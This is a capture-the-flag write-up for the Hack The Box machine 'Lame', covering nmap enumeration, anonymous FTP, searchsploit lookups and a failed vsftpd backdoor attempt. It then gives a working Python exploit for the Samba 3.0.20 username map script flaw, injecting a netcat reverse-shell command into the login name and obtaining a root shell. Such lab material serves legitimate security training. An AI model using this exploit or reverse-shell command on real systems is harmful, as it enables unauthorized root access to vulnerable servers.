# Lame

## IP: 10.10.10.3

First, add `10.10.10.3    lame.htb` to your `/etc/hosts` file.

Then run a standard `nmap` portscan.

```bash
$ nmap -vvv -sCV -oN lame.nmap lame.htb -Pn
# Nmap 7.80 scan initiated Mon Apr 20 02:08:43 2020 as: nmap -vvv -sCV -oN lame.nmap -Pn lame.htb
Nmap scan report for lame.htb (10.10.10.3)
Host is up, received user-set (0.048s latency).
Scanned at 2020-04-20 02:08:43 CDT for 56s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE     REASON  VERSION
21/tcp  open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.31
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h03m30s, deviation: 2h49m45s, median: 3m27s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 65162/tcp): CLEAN (Timeout)
|   Check 3 (port 25048/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-04-20T03:12:32-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 20 02:09:39 2020 -- 1 IP address (1 host up) scanned in 56.55 seconds
```

Just to be thorough, we run an all ports scan. It picks up one new port.

```bash
$ nmap -sVC -O -p- -vvv -oN enumeration/allports.nmap lame.htb
...
3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
...
```

We see `vsftpd 2.3.4` running on port 21, with anonymous logins allowed. Let's see what's on the FTP share.

```bash
$ ftp lame.htb
Connected to lame.htb.
220 (vsFTPd 2.3.4)
Name (lame.htb:alichtman): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

Nothing too interesting. Let's see if `searchsploit` has anything interesting for us.

```bash
searchsploit vsftpd 2.3.4
------------------------------------------------------- ------------------------------
 Exploit Title                                         |  Path
                                                       | (/usr/share/exploitdb/)
------------------------------------------------------- ------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | exploits/unix/remote/17491.rb
------------------------------------------------------- ------------------------------
Shellcodes: No Result
Papers: No Result
```

According to the [vsftpd Wikipedia page](https://en.wikipedia.org/wiki/Vsftpd), "an unknown attacker had uploaded a different version of vsftpd which contained a backdoor." This means that the `vsftpd` version running on the machine may not actually be vulnerable.

I found [this](https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py) `Python` exploit for `vsftpd` on GitHub, however, it failed every time. It is likely that the version of `vsftpd` running on the machine is not vulnerable.

We also have `Samba smbd 3.0.20-Debian` running on the machine. Let's see what `searchsploit` has to say about that.

```bash
$ searchsploit Samba 3.0.20
---------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                          |  Path
                                                                                        | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------- ----------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)        | exploits/unix/remote/16320.rb
---------------------------------------------------------------------------------------- ----------------------------------------
```

The exploit seems pretty simple, just throwing the command to be executed in the login line, like this:

```ruby
def exploit
    connect
    # lol?
    username = "/=`nohup " + payload.encoded + "`"
```

Let's find something to connect to:

```bash
$ smbmap -H lame.htb
smbmap -H lame.htb
[+] IP: lame.htb:445    Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

We can read and write to `/tmp`, so let's connect to that.

```bash
$ smbclient //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
$ smbclient ////10.10.10.3//tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
...
...
```

Ok, maybe `smbclient` is just misbehaving. Let's do this in `python`.

```python
# pip3 install pysmb
from smb.SMBConnection import SMBConnection
from smb import smb_structs
import sys

smb_structs.SUPPORT_SMB2 = False

if len(sys.argv) < 2:
    print(f"\nUsage: {sys.argv[0]} <HOST>\n")
    sys.exit()

username = "/=`nohup nc -e /bin/bash 10.10.14.5 1234`"
password = ""
conn = SMBConnection(username, password, "LAME-HTB" , "HTB", use_ntlm_v2=False)
conn.connect(sys.argv[1], 445)
```

Starting a `nc` listener on port `1234` and running the exploit above gives us a root shell.

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.3] 35998
whoami
root
```

